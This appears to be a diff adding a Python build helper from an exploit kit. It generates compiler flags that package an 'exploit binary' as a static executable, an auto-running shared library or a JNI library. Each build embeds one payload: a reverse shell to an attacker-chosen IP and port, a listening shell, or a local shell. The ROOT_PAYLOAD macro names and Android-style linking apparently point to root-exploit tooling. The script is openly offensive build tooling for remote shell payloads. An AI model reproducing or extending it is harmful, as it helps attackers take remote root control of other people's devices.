@@ -1,0 +1,53 @@
+#!/usr/bin/env python
+
+import argparse
+import sys
+import os
+
+def main():
+    parser = argparse.ArgumentParser(
+        prog='payload-flags',
+        description='Generates CFLAGS for exploit binary',
+    )
+
+    entrypoint_group = parser.add_mutually_exclusive_group(required=True)
+    payload_group = parser.add_mutually_exclusive_group(required=True)
+
+    entrypoint_group.add_argument('--static', action='store_true', help='Build binary as static executable')
+    entrypoint_group.add_argument('--shared', action='store_true', help='Build binary as shared library which calls the main on load')
+    entrypoint_group.add_argument('--jni', action='store_true', help='Build binary as a JNI shared library which calls main on JNI load')
+
+    payload_group.add_argument('--reverse-shell', action='store_true')
+    payload_group.add_argument('--listening-shell', action='store_true')
+    payload_group.add_argument('--shell', action='store_true')
+
+    parser.add_argument('--ip', help='IP address for reverse shell to connect to')
+    parser.add_argument('--port', type=int, help='Port for listning shell and reverse shell')
+
+    args = parser.parse_args()
+
+    if (args.listening_shell or args.reverse_shell) and (args.port is None):
+        parser.error('--port required')
+
+    if args.reverse_shell and args.ip is None:
+        parser.error('--ip required')
+
+    if args.shell:
+        flags = ''
+    elif args.listening_shell:
+        flags = f'-DLISTENING_SHELL -DROOT_PAYLOAD_PORT={args.port} '
+    elif args.reverse_shell:
+        flags = f'-DREVERSE_SHELL -DROOT_PAYLOAD_PORT={args.port} -DROOT_PAYLOAD_IP={args.ip}'
+
+    if args.static:
+        flags += '-static -fno-pie -DEXPLOIT_STATIC'
+    elif args.shared:
+        flags += '-shared -llog -DEXPLOIT_SHARED'
+    elif args.jni:
+        flags += '-shared -llog -DEXPLOIT_JNI'
+
+    common_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
+    print(f'-I{common_dir} {flags}')
+
+if __name__ == '__main__':
+    main()
